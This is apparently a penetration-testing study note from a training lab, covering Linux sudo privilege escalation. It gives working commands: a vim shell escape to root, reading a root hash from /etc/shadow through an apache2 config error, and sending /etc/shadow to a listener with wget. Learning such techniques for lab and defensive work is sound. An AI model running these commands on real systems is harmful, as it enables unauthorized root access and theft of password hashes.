## Shell Escaping

We can find the commands our user can run as sudo by typing `sudo -l`

```bash
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

We see that there are several commands we can run as sudo without a password as this user. We can use one of these commands to see whether there is shell escape available though [GTFOBins](https://gtfobins.github.io/). For example we can exploit `vim` as follow.

```bash
TCM@debian:~$ sudo vim -c ':!/bin/sh'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
```

## Intended Functionality

There can be situations where a direct path of exploitation is not available based on the sudo commands we have access to. However, we can manipulate the functionalities of tools to gains access to resources as sudo. 

For example, if we can run `apache2` as sudo, we can use the `-f` flag to provide the `/etc/passwd` file as the config file resulting in an error and printing out the first line as the error message.

```bash
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

Another example is if we can run `wget` as sudo, we can use the `--post-file` command to send the `/etc/shadow` file through  to a listener that we set up.

## LD_PRELOAD

Check [[Privilege Escalation#^f03211|here]] for more details
